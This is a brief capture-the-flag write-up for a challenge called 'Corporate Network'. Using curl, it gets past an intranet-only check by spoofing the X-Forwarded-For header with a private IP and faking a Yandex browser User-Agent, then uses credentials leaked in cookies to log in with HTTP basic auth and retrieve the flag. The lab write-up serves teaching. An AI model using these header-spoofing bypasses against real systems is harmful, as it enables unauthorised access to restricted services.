# Corporate Network

Bypass an IP-based and browser-based access restriction designed to simulate a page only accessible from a company’s internal network (intranet).

```bash
curl -s http://141.85.224.118:8080/
```

Response:

```pgsql
You can access this page only from the company's intranet!
```

## Trick Internal IP via Headers

- Try X-Forwarded-For and X-Real-IP headers:

```bash
curl -s -H "X-Forwarded-For: 127.0.0.1" http://141.85.224.118:8080/
```
...Still blocked.

- Try a private LAN IP:

```bash
curl -s -H "X-Forwarded-For: 192.168.0.1" http://141.85.224.118:8080/
```

...New Response:

```pgsql
You need to use the default browser installed on your Windows Work Computer (Yandex) to access the intranet!
```
...now it's checking for a browser.

## Trick the User-Agent (Yandex Browser)

```bash
curl -i -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 YaBrowser/21.3.1.109 Yowser/2.5 Safari/537.36" \
     -H "X-Forwarded-For: 192.168.0.1" \
     http://141.85.224.118:8080/
```

Response Headers:

```pgsql
HTTP/1.0 401 Unauthorized
Set-Cookie: user=aladdin
Set-Cookie: password=opensesame
```

We now have credentials via cookies:
- user=aladdin
- password=opensesame

## Simulating a basic HTTP login

```bash
curl -u aladdin:opensesame \
     -A "YaBrowser/21.3.1.109" \
     -H "X-Forwarded-For: 192.168.0.1" \
     http://141.85.224.118:8080/
```

Response: **SSS{oooo0000hh_deeee3333p_bre3ach}**
